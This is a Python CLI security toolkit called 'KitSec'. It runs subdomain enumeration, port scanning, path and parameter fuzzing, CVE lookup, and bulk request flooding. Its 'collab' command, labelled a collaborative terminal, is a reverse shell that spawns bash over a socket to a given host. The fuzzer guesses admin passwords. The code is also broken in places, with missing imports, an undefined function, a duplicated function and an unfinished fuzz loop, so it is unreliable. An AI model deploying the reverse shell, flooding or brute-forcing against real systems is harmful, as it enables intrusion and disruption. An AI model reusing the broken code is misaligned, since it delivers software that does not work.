import os
import time
import gzip
import socket
import warnings
import subprocess
import urllib.parse
from typing import List
import hashlib

import requests
import paramiko
import concurrent
import pandas as pd
from tqdm import tqdm
from bs4 import BeautifulSoup
from tabulate import tabulate
from urllib.parse import urlparse
from Wappalyzer import Wappalyzer, WebPage


import html
import json
import black
import magic
import click
import base64
import platform
import textwrap
import binascii



#fix enumerator's output when yessing both technology and requests.
#Add XSS scanner (https://github.com/s0md3v/XSStrike)

#add user agent rotation
#add proxy rotation


@click.group()
def cli():
    """
    KitSec - A CLI tool for security testing and reconnaissance.
    """
    pass


@click.command()
def vps_logger():
    """
    Connects to a remote VPS server and tails the auth.log file.

    Returns:
    - Prints a continuous stream of output from the auth.log file to the console.

    The program attempts to connect to the specified VPS server using SSH, with the provided
    username and password. Once connected, it invokes a shell and sends the command to tail
    the auth.log file using sudo. It then continuously checks for new output from the file and
    prints it to the console as it is received.
    """
    # Prompt the user for the VPS server IP address, limited user account, and password
    host = click.prompt('Enter the IP address of the VPS server to connect to')
    username = click.prompt('Enter the limited user account to use for connecting to the VPS server')
    password = click.prompt('Enter the password for the user account', hide_input=True)

    # Create an SSH client object and set the missing host key policy to auto add
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Connect to the VPS server using the provided host, username, and password
    ssh.connect(host, username=username, password=password)
    
    # Invoke a shell and send the command to tail the auth.log file using sudo
    channel = ssh.invoke_shell()
    channel.send('sudo tail -f /var/log/auth.log\n')
    
    # Continuously check for new output from the auth.log file and print it to the console
    while True:
        if channel.recv_ready():
            output = channel.recv(1024).decode('utf-8')
            click.echo(output, nl=False)



@click.command()
@click.argument('host')
@click.argument('port')
def collab(host, port):
    """
    Connects to a remote machine and starts a collaborative terminal.

    Args:
    - host (str): The IP address or hostname of the remote machine.
    - port (int): The port to connect to on the remote machine.

    Returns:
    - None. Starts a collaborative terminal session with the remote machine.

    The program attempts to connect to the specified remote machine on the specified port.
    If the connection is successful, it starts a new terminal session that is shared between
    the local machine and the remote machine. All input and output is echoed to both machines.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, int(port)))
        click.echo(f'Connected to {host}:{port}.')

        pty.spawn(['/bin/bash'], stdin=sock, stdout=sock, stderr=sock)

        click.echo('Terminal closed.')
    except socket.error as e:
        click.echo(f'Error connecting to {host}:{port}: {e}')



@click.command()
def capture():
    """
    Captures the request headers for a given URL.

    Returns:
    - Prints a string containing the captured request headers, including method, hostname, path, cookies, and all other headers sent with the request.
    """
    # Prompt the user for the URL
    url = click.prompt('Enter the URL to capture request headers for')

    # Make a request to the given URL and capture the request headers
    response = requests.get(url)
    headers = response.request.headers

    # Parse the URL to get the hostname and path
    parsed_url = urllib.parse.urlparse(url)
    hostname = parsed_url.hostname
    path = parsed_url.path

    # Construct the request info string
    request_info = f"{response.request.method} {path} HTTP/1.1\n"
    request_info += f"Host: {hostname}\n"
    
    cookie_lines = headers.get("Cookie", "").split("; ")
    cookies = "\n".join(cookie_lines)
    request_info += f"Cookie: {cookies}\n"
    
    request_info += "\n".join([f"{header}: {value}" for header, value in headers.items() if header not in ["Host", "User-Agent", "Cookie"]])
    request_info += "\n\n"
    
    # Add response headers
    request_info += "Response headers:\n"
    request_info += textwrap.indent("\n".join([f"  {header}: {value}" for header, value in response.headers.items()]), "  ")
    request_info += "\n"
    
    print(request_info)



@click.command()
def convert():
    """
    Applies a specified decoding or hashing function to input data.

    Returns:
    - The transformed input data as a string.

    If the input data is text, the program will prompt for input and apply the specified transformation type, then return the result.
    If the input data is binary, the program will apply the specified hashing function and return the resulting hash.
    If an invalid transformation type is specified, the program will return an error message.
    """
    # Prompt for input data
    data = click.prompt('Enter the input data')

    # Prompt for transformation type using arrow keys
    transformation_types = ['URL', 'HTML', 'Base64', 'ASCII', 'Hex', 'Octal', 'Binary', 'MD5', 'SHA1', 'SHA256', 'BLAKE2B-160', 'GZIP']
    prompt_message = f'Enter the type of transformation to apply:'
    transformation_type = click.prompt(prompt_message, type=click.Choice(transformation_types), default='Base64', show_choices=True)

    detected_type = magic.from_buffer(data, mime=True)
    if detected_type.startswith('text'):
        if transformation_type == "URL":
            result = urllib.parse.unquote(data)
        elif transformation_type == "HTML":
            result = html.unescape(data)
        elif transformation_type == "Base64":
            decoded_bytes = base64.b64decode(data)
            result = decoded_bytes.decode('utf-8')
        elif transformation_type == "ASCII":
            try:
                result = bytearray.fromhex(data).decode()
            except ValueError:
                result = "Invalid ASCII input"
        elif transformation_type == "Hex":
            try:
                result = bytes.fromhex(data).decode('utf-8')
            except ValueError:
                result = "Invalid hex input"
        elif transformation_type == "Octal":
            try:
                result = ''.join([chr(int(octet, 8)) for octet in data.split()])
            except ValueError:
                result = "Invalid octal input"
        elif transformation_type == "Binary":
            try:
                result = ''.join([chr(int(octet, 2)) for octet in data.split()])
            except ValueError:
                result = "Invalid binary input"
        elif transformation_type == "GZIP":
            try:
                decoded = gzip.decompress(data)
                result = decoded.decode('utf-8')
            except Exception:
                result = "Invalid GZIP input"
        else:
            result = "Invalid decoding or hashing type"
    else:
        if transformation_type == "MD5":
            result = hashlib.md5(data).hexdigest()
        elif transformation_type == "SHA1":
            result = hashlib.sha1(data).hexdigest()
        elif transformation_type == "SHA256":
            result = hashlib.sha256(data).hexdigest()
        elif transformation_type == "BLAKE2B-160":
            result = hashlib.blake2b(data, digest_size=20).hexdigest()
        else:
            result = "Invalid decoding or hashing type"

    click.echo(result)



def shuffle(url):
    """
    Sends a GET request to the provided URL with shuffled proxies, ports, user agents,
    and headers.

    Args:
    - url (str): The URL to send the GET request to.

    Returns:
    - If the GET request is successful, returns the response text. Otherwise, returns None.

    The function shuffles a list of proxies, ports, user agents, and headers, and selects
    the first shuffled item for each parameter. It then creates a dictionary of shuffled proxy
    and header parameters and sends a GET request to the provided URL with these parameters.
    If the GET request is successful, the function returns the response text. Otherwise,
    it returns None.
    """
    # Define proxies, ports, user agents, and headers to shuffle
    proxies = ['1.2.3.4:8080', '5.6.7.8:3128', '9.10.11.12:80']
    ports = ['80', '8080', '3128']
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0']
    headers = {'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive'}

    # Shuffle the proxies, ports, user agents, and headers
    random.shuffle(proxies)
    random.shuffle(ports)
    random.shuffle(user_agents)
    random.shuffle(headers)
    
    # Select the first shuffled item for each parameter
    proxy = proxies[0]
    port = ports[0]
    user_agent = user_agents[0]
    header = headers[0]
    
    # Create dictionary of shuffled proxy and header parameters
    proxies_dict = {'http': f'http://{proxy}:{port}', 'https': f'https://{proxy}:{port}'}
    headers_dict = {'User-Agent': user_agent, **header}
    
    # Send GET request with shuffled parameters and handle exceptions
    try:
        response = requests.get(url, proxies=proxies_dict, headers=headers_dict)
        response.raise_for_status()
        return response.text
    except (requests.exceptions.RequestException, ValueError):
        return None




def passive_enumerator(domain):
    """
    Uses multiple tools to passively enumerate subdomains for a given domain.

    Args:
        domain (str): The domain to enumerate subdomains for.

    Returns:
        set: A set of subdomains.
    """
    # Initialize set to store subdomains
    subdomains = set()

    # Check if Subfinder is installed and run it if it is
    try:
        print('Enumerating using Subfinder...')
        with open(os.devnull, 'w') as nullfile:
            subfinder_output = subprocess.check_output(['subfinder', '-d', domain], stderr=nullfile)

        # Add Subfinder output to set of subdomains
        subdomains.update(subfinder_output.decode('utf-8').strip().split('\n'))
    except:
        print('Subfinder is not installed, skipping...')

    # Use Findomain to passively enumerate subdomains
    subdomains.update(findomain_enumerator(domain))

    # Check if Assetfinder is installed and run it if it is
    try:
        print('Enumerating using Assetfinder...')
        with open(os.devnull, 'w') as nullfile:
            assetfinder_output = subprocess.check_output(['assetfinder', '--subs-only', domain], stderr=nullfile)

        # Add Assetfinder output to set of subdomains
        subdomains.update([s.split('.')[0] for s in assetfinder_output.decode('utf-8').strip().split('\n')])
    except:
        print('Assetfinder is not installed, skipping...')

    # Check if Amass is installed and run it if it is
    try:
        print('Enumerating using Amass...')
        with open(os.devnull, 'w') as nullfile:
            amass_output = subprocess.check_output(['amass', 'enum', '--passive', '-d', domain], stderr=nullfile)

        # Add Amass output to set of subdomains with the domain appended
        subdomains.update([s.split('.')[0] + '.' + domain for s in amass_output.decode('utf-8').strip().split('\n')])
    except:
        print('Amass is not installed, skipping...')

    # Remove duplicates from set of subdomains
    subdomains = set(subdomains)

    # Return set of subdomains
    return subdomains



def passive_enumerator(domain):
    """
    Uses multiple tools to passively enumerate subdomains for a given domain.

    Args:
        domain (str): The domain to enumerate subdomains for.

    Returns:
        set: A set of subdomains.
    """
    # Initialize set to store subdomains
    subdomains = set()

    # List of enumeration tools
    tools = [
        {'name': 'Subfinder', 'cmd': ['subfinder', '-d', domain]},
        {'name': 'Findomain', 'cmd': ['findomain', '-t', domain]},
        {'name': 'Assetfinder', 'cmd': ['assetfinder', '--subs-only', domain]},
        {'name': 'Amass', 'cmd': ['amass', 'enum', '--passive', '-d', domain]}
    ]

    # Iterate over tools and run them
    while True:
        for tool in tools:
            name = tool['name']
            cmd = tool['cmd']
            try:
                print(f'Enumerating using {name}...')
                with open(os.devnull, 'w') as nullfile:
                    output = subprocess.check_output(cmd, stderr=nullfile)

                # Add output to set of subdomains
                if name == 'Subfinder':
                    subdomains.update(output.decode('utf-8').strip().split('\n'))
                elif name == 'Findomain':
                    subdomains.update(output.decode('utf-8').strip().split('\n')[1:])
                    subdomains = set([x for x in subdomains if domain in x])
                elif name == 'Assetfinder':
                    subdomains.update([s.split('.')[0] for s in output.decode('utf-8').strip().split('\n')])
                elif name == 'Amass':
                    subdomains.update([s.split('.')[0] + '.' + domain for s in output.decode('utf-8').strip().split('\n')])
            except:
                print(f'{name} is not installed or encountered an error, skipping...')

        # Remove duplicates from set of subdomains
        subdomains = set(subdomains)

        # Check if any tools failed or all have been run successfully
        if all([tool['name'] not in subdomains for tool in tools]):
            break

    # Return set of subdomains
    return subdomains



def active_enumerator(domain):
    """
    Enumerates subdomains for a given domain, and checks which ones are active.
    Args:
        domain (str): The domain to enumerate subdomains for.
    Returns:
        set or None: A set of subdomains, or None if no subdomains were found.
    """
    subdomains = set()
    
    # Check if subdomains directory exists
    dir_path = "../lists/active_enumerator"
    if not os.path.isdir(dir_path):
        raise FileNotFoundError(f"Subdomains directory '{dir_path}' not found")
    
    # Get list of subdomain files in directory
    file_names = [file_name for file_name in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, file_name)) and file_name.endswith(".txt")]
    total_files = len(file_names)
    
    # Enumerate subdomains from each file and check if active
    for i, file_name in enumerate(file_names):
        file_path = os.path.join(dir_path, file_name)
        with open(file_path, "r") as subdomain_file:
            for line in tqdm(subdomain_file, desc="Active enumeration", unit="Subdomains"):
                subdomain = line.strip()
                full_domain = subdomain + "." + domain
                try:
                    # Send a HEAD request to check if the subdomain is active
                    response = requests.head("https://" + full_domain, timeout=3)
                    if response.status_code < 400:
                        subdomains.add(subdomain)
                
                # Ignore exceptions and continue to the next subdomain
                except:
                    pass
    
    # Return set of active subdomains or empty set if none were found
    if subdomains:
        return subdomains
    else:
        return set()


def fetch_response(subdomains: List[str], technology: bool) -> List[List[str]]:
    """
    Fetches the HTTP response codes and reasons for a list of subdomains.

    Args:
    - subdomains (List[str]): A list of subdomains to fetch responses for.
    - technology (bool): Whether to also fetch the technologies used by each subdomain.

    Returns:
    - A list of lists, where each sub-list contains the following fields for a subdomain:
      - Subdomain name (str)
      - HTTP status code (int)
      - HTTP status reason (str)
      - List of technologies used by the subdomain (if technology is True), or an empty string (if technology is False).
    """
    # Initialize empty response table and create a session object for TCP connection reuse
    response_table = []
    session = requests.Session()
    
    # Fetch response for each subdomain in the list
    for subdomain in tqdm(subdomains, desc='Fetching response', unit='subdomain', leave=False):
        try:
            # Make HTTP GET request with timeout of 5 seconds
            response = session.get(f'http://{subdomain}', timeout=5)
            response_table.append([subdomain, response.status_code, response.reason, ''])
            
            # Fetch technology if specified
            if technology:
                tech = fetch_tech(subdomain)
                response_table[-1][-1] = tech
            
            # Add a delay of 0.5 seconds to avoid overloading the target website
            time.sleep(0.5)
        
        # Handle timeout and connection errors
        except requests.exceptions.Timeout:
            print(f"Skipped '{subdomain}'")
            continue
        except requests.exceptions.ConnectionError:
            print(f"Skipped '{subdomain}'")
            continue
        
        # Handle other exceptions
        except Exception as e:
            print(f"Skipped '{subdomain}': {str(e)}")
            continue
    
    # Return response table
    return response_table



def fetch_tech(url):
    """
    Fetches the technologies used by a website using Wappalyzer.

    Args:
    - url (str): The URL of the website to analyze.

    Returns:
    - A list of strings representing the technologies used by the website.
    - If an error occurs while fetching the technologies, returns None.
    """
    #ignore JAVA warnings on wappalyzer & skip
    warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
    warnings.filterwarnings("ignore", category=UserWarning, message=".*It looks like you're parsing an XML document using an HTML parser.*")
    warnings.filterwarnings("ignore", message="""Caught 'unbalanced parenthesis at position 119' compiling regex""", category=UserWarning )

    print(f"Fetching technologies for {url}")
    # Ensure URL starts with http(s)
    if not url.startswith('http'):
        url = 'https://' + url
    
    # Fetch web page and analyze with Wappalyzer
    technologies = []
    
    # Retry fetching up to 5 times in case of error
    max_retries = 5
    retry_count = 0
    while retry_count < max_retries:
        try:
            # Create WebPage object and analyze with Wappalyzer
            webpage = WebPage.new_from_url(url)
            wappalyzer = Wappalyzer.latest()
            for tech in wappalyzer.analyze(webpage):
                technologies.append(tech)
            return technologies
        
        # Handle timeout and connection errors
        except requests.exceptions.Timeout:
            print(f"Timeout fetching technologies for {url}")
            return None
        except requests.exceptions.ConnectionError:
            print(f"Connection error fetching technologies for {url}")
            return None
        
        # Handle other exceptions
        except Exception as e:
            retry_count += 1
            print(f"Error fetching technologies for {url} ({str(e)})")
            if retry_count < max_retries:
                print(f"Retrying ({retry_count}/{max_retries})")
                time.sleep(5)
    
    # Max retries reached, return None
    print(f"Max retries reached for {url}")
    return None



@click.command()
def enumerator():
    """
    Enumerates subdomains for a given domain using Subfinder and active enumeration.
    """
    # Prompt user for domain
    domain = click.prompt('Enter the domain to enumerate subdomains for')

    # Prompt user for options
    request = click.prompt('Test subdomains and print http response for active ones [Y/n]')
    request = request.lower() == 'y'
    technology = click.prompt('Analyze technology used by subdomains [Y/n]')
    technology = technology.lower() == 'y'
    active = click.prompt('Use active subdomain enumeration [Y/n]')
    active = active.lower() == 'y'

    # Get subdomains using Subfinder
    subdomains = passive_enumerator(domain)

    if active:
        # Enumerate subdomains using active enumeration
        active_subdomains = active_enumerator(domain)
        # Add the active subdomains to the set of subdomains
        subdomains.update(active_subdomains)

    if request:
        # Test subdomains and print http response for active ones
        response_table = fetch_response(subdomains, False)
        # sort response_table by status in ascending order
        response_table = sorted(response_table, key=lambda x: x[1])
        click.echo(tabulate(response_table, headers=['Subdomain', 'Status', 'Reason']))

    if technology:
        # Analyze technology used by subdomains
        tech_table = []
        for subdomain in subdomains:
            tech = fetch_tech(subdomain)
            tech_table.append([subdomain, tech])
        click.echo(tabulate(tech_table, headers=['Subdomain', 'Technology']))

    if not request and not technology:
        # Just print the subdomains
        subdomains_list = list(subdomains)
        with tqdm(total=len(subdomains_list), desc='Enumerating subdomains', unit='subdomain') as pbar:
            subdomains_list = [[subdomain] for subdomain in subdomains_list]
            click.echo(tabulate(subdomains_list, headers=['Subdomain']))
            pbar.update(len(subdomains_list))




@click.command()
def disturb():
    """
    Sends multiple HTTP requests to the specified URL with the same payload.

    Returns:
    - A list of HTTP responses for each request sent.

    The program sends multiple HTTP requests to the specified URL using the provided HTTP method, payload,
    headers, and cookies. The user can also specify the number of times to repeat the request. The program
    returns a list of HTTP responses for each request sent.
    """
    # Prompt the user for the URL to send the request to
    url = click.prompt('Enter the URL to send the request to', required=True)

    # Prompt the user for the HTTP method to use
    method = click.prompt('Enter the HTTP method to use', default='GET')

    # Prompt the user for the payload to include in the request body
    payload = click.prompt('Enter the payload to include in the request body (leave blank for none)', default='')

    # Prompt the user for the headers to include in the request
    headers = click.prompt('Enter the headers to include in the request (leave blank for none)', default='')

    # Prompt the user for the cookies to include in the request
    cookies = click.prompt('Enter the cookies to include in the request (leave blank for none)', default='')

    # Prompt the user for the number of times to repeat the request
    count = click.prompt('Enter the number of times to repeat the request', default=1)

    responses = []
    for i in range(count):
        response = requests.request(method, url, data=payload, headers=headers, cookies=cookies)
        responses.append(response)
    return responses



@click.command()
def raid():
    """
    Sends HTTP requests to a given URL with a specified number of threats and requests.
    """
    # Prompt the user for the URL to send the requests to
    url = click.prompt('Enter the URL to send the requests to (i.e. subdomain.domain.com)', type=str)

    # Prompt the user for the number of parallel threats to send requests from
    num_threats = click.prompt('Enter the number of parallel threats to send requests from', type=int, default=6)

    # Prompt the user for the number of requests to send from each threat
    num_requests = click.prompt('Enter the number of requests to send from each threat', type=int, default=200)

    # Prompt the user for the number of times to retry failed requests
    num_retries = click.prompt('Enter the number of times to retry failed requests', type=int, default=4)

    # Prompt the user for the number of milliseconds to wait before retrying a failed request
    pause_before_retry = click.prompt('Enter the number of milliseconds to wait before retrying a failed request', type=int, default=3000)

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url
    prepared_request = requests.Request('GET', url).prepare()
    results = []
    with requests.Session() as session:
        adapter = requests.adapters.HTTPAdapter(max_retries=num_retries)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        pool = session.send
        for i in range(num_threats):
            threat_results = []
            with tqdm(total=num_requests, desc=f'Threat {i+1}') as pbar:
                for j in range(num_requests):
                    response = pool(prepared_request)
                    threat_results.append(response)
                    if response.status_code == 200:
                        break
                    time.sleep(pause_before_retry/1000)
                    pbar.update(1)
            results.append(threat_results)
    click.echo(results)



@click.command()
def portscan():
    """
    Performs a TCP port scan on a specified hostname or URL and a range of ports.

    Prompts:
    - URL: the hostname or URL of the target host.
    - Common ports: whether to scan only the most common HTTP ports (80, 8080, and 443).

    Returns:
    - None. Prints the open ports found on the target host.
    """

    # Prompt for the URL
    url = click.prompt('Enter the URL of the target host')

    # Add a scheme to the URL if it is not present
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url

    # Parse the URL to extract the hostname
    hostname = urlparse(url).hostname or url

    # Resolve the hostname to an IP address
    ip_address = socket.gethostbyname(hostname)

    open_ports = []

    # Define a function to scan a single port
    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        try:
            sock.connect((ip_address, port))
            open_ports.append(f"{hostname}:{port}")
        except:
            pass
        finally:
            sock.close()

    # Prompt for whether to scan only common ports
    if not url.startswith('http://') and not url.startswith('https://'):
        common_ports = click.confirm('Scan only the most common HTTP ports (80, 8080, and 443)?', default=True)
    else:
        common_ports = click.confirm('Scan only the most common HTTP ports (80, 8080, and 443) for ' + hostname + '?', default=True)

    # Scan only the most common HTTP ports if the --common-ports flag is set
    if common_ports:
        ports = [80, 8080, 443]
    else:
        ports = range(1, 65536)

    # Use multi-threading to scan ports in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, port) for port in ports]
        with tqdm(total=len(futures), desc="Scanning Ports", unit="ports") as progress:
            for future in concurrent.futures.as_completed(futures):
                progress.update(1)

    # Print the open ports
    click.echo('\nOpen Ports:')
    for port in open_ports:
        click.echo(port)



@click.command()
def inject():
    """
    Sends HTTP GET requests to a specified base URL with a given list of paths.

    Prompts:
    - Base URL: The base URL to send requests to. The URL must include the protocol (http or https).
    - Path: Whether to use the default path '../lists/injector' or a custom path to a file or directory containing a list of paths to send requests to.

    Returns:
    - None. For each request sent, the program will print the URL and response code to the console if the response code is 200.
    """

    # Prompt for the base URL
    base_url = click.prompt('Enter the base URL to send requests to. The URL must include the protocol (http or https)')

    # Add http or https prefix if missing
    if not base_url.startswith('http'):
        base_url = 'http://' + base_url

    # Prompt for custom path or use default path
    path_choice = click.prompt('Would you like to use the default path or a custom path? (Default: ../lists/injector)', type=click.Choice(['default', 'custom'], case_sensitive=False), default='default', show_choices=True)

    if path_choice == 'default':
        path = '../lists/injector'
    else:
        path = click.prompt('Enter the path to a file or directory containing a list of paths to send requests to')

    # Check if the path is a directory or a file
    if os.path.isdir(path):
        # If the path is a directory, iterate through each file in the directory
        for filename in os.listdir(path):
            filepath = os.path.join(path, filename)
            if os.path.isfile(filepath):
                # If the file is a regular file, read each line in the file and send a request to the URL
                with open(filepath) as f:
                    paths = f.read().splitlines()
                    progress_bar = tqdm(paths, desc=filename, position=0, leave=True)
                    for p in progress_bar:
                        url = f"{base_url}/{p}"
                        response = requests.get(url)
                        # If the response code is 200, print the URL and response code to the console
                        if response.status_code == 200:
                            click.echo(f"{url} - {response.status_code}")
    elif os.path.isfile(path):
        # If the path is a regular file, read each line in the file and send a request to the URL
        with open(path) as f:
            paths = f.read().splitlines()
            progress_bar = tqdm(paths, desc=os.path.basename(path), position=0, leave=True)
            for p in progress_bar:
                url = f"{base_url}/{p}"
                response = requests.get(url)
                # If the response code is 200, print the URL and response code to the console
                if response.status_code == 200:
                    click.echo(f"{url} - {response.status_code}")
    else:
        # If the path does not exist, print an error message to the console
        click.echo(f"{path} does not exist")



def fetch_cwe(cwe_code):
    """Fetches the CWE name given a CWE code.

    :param cwe_code: The CWE code to fetch the name for.
    :type cwe_code: str
    :return: The name of the CWE.
    :rtype: str
    """
    # Construct the URL for the CWE code
    cwe_url = f"https://cwe.mitre.org/data/definitions/{cwe_code[4:].lower()}.html"

    # Send a GET request to the URL and parse the HTML response with BeautifulSoup
    response = requests.get(cwe_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract the CWE name from the page title
    cwe_title = soup.find('title').text.strip()
    cwe_name = cwe_title.split(':')[1].strip()

    # Return the CWE code and name as a formatted string
    return f"{cwe_code}: {cwe_name}"



@click.command()
def cve():
    """
    Retrieve CVE data for a specific product name (company name) and display it in a clean format.
    """
    # Prompt user for product name and number of results to display
    product_name = click.prompt("Enter the product name")
    limit = click.prompt("Enter the number of results to display", type=int)

    # Make request to the NVD API and extract relevant fields
    url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={product_name}&resultsPerPage={limit}"
    response = requests.get(url)
    data = response.json()
    cve_items = data.get("result", {}).get("CVE_Items", [])

    # Prepare the data to be displayed in a table format
    table_data = []
    for item in cve_items:
        # Extract CVE ID, severity, and summary fields
        cve_id = item.get("cve", {}).get("CVE_data_meta", {}).get("ID")
        severity = item.get("impact", {}).get("baseSeverity", "Unknown")
        if severity == "Unknown":
            severity_msg = "Severity information not available"
        else:
            severity_msg = severity
        summary = item.get("cve", {}).get("description", {}).get("description_data", [])
        summary = next((x.get("value") for x in summary if x.get("lang") == "en"), "")

        # Extract CWE information and append it to the data
        cwe_nodes = item.get("cve", {}).get("problemtype", {}).get("problemtype_data", [])
        cwe_codes = [n.get("description", [{}])[0].get("value", "") for n in cwe_nodes if n.get("description")]
        for cwe_code in cwe_codes:
            cwe_name = fetch_cwe(cwe_code)
            table_data.append(["CVE ID", cve_id])
            table_data.append(["CWE", cwe_name])
            table_data.append(["Severity", severity_msg])
            table_data.append(["Summary", summary])
            table_data.append(["", ""])  # Add an empty row for spacing
    
    # Display the data in a table format
    headers = ["", ""]
    click.echo(tabulate(table_data, headers=headers, tablefmt="plain"))

DEFAULT_PARAMNAMES_PATH = os.path.join(os.path.dirname(__file__), 'paramnames.txt')
DEFAULT_VALUES_PATH = os.path.join(os.path.dirname(__file__), 'values.txt')
DEFAULT_POSTDATA_PATH = os.path.join(os.path.dirname(__file__), 'postdata.txt')

@click.command()
def fuzz():
    """
    This function performs parameter fuzzing using wordlists.
    """
    # Ask the user for the target URL
    url = click.prompt('Enter the target URL', type=str)

    # Ask the user for the HTTP method
    http_method = click.prompt('Enter the HTTP method (e.g. POST, GET)', default='GET', type=str)

    # Ask the user for the parameter names wordlist file path, default to the default path
    paramnames_path = click.prompt('Enter the path to the parameter names wordlist file', default=DEFAULT_PARAMNAMES_PATH, type=str)

    # Ask the user for the values wordlist file path, default to the default path
    values_path = click.prompt('Enter the path to the values wordlist file', default=DEFAULT_VALUES_PATH, type=str)

    # Ask the user for the expected response size for invalid parameter names, default to 4242
    invalid_param_size = click.prompt('Enter the expected response size for invalid parameter names', default=4242, type=int)

    # Ask the user for the expected HTTP status code for invalid parameter values, default to 401
    invalid_value_status = click.prompt('Enter the expected HTTP status code for invalid parameter values', default=401, type=int)

    # Ask the user for the request data file path (for POST requests), default to the default path
    postdata_path = click.prompt('Enter the path to the POST data wordlist file (for POST requests only)', default=DEFAULT_POSTDATA_PATH, type=str)

    # Read the parameter names wordlist file and store its contents in a list
    with open(paramnames_path, 'r') as f:
        paramnames_contents = f.read().splitlines()

    # Read the values wordlist file and store its contents in a list
    with open(values_path, 'r') as f:
        values_contents = f.read().splitlines()

    # Read the POST data wordlist file and store its contents in a list
    with open(postdata_path, 'r') as f:
        postdata_contents = f.read().splitlines()

    # Loop through each parameter name in the parameter names wordlist and each value in the values wordlist, and send a request to the target URL with that parameter name and value
    for paramname in paramnames_contents:
        for value in values_contents:
            if http_method == 'GET':
                params = {paramname: value}
                response = requests.get(url, params=params)
            elif http_method == 'POST':
                # Replace the FUZZ keyword in the POST data with the value from the wordlist
                postdata = 'username=admin&password=' + value if 'FUZZ' in postdata_contents[0] else postdata_contents[0].replace('FUZZ', value)
                response = requests.post(url, data=postdata)

cli.add_command(vps_logger)
cli.add_command(collab)
cli.add_command(capture)
cli.add_command(convert)
cli.add_command(enumerator)
cli.add_command(disturb)
cli.add_command(raid)
cli.add_command(portscan)
cli.add_command(inject)
cli.add_command(cve)
cli.add_command(fuzz)



if __name__ == '__main__':
    cli()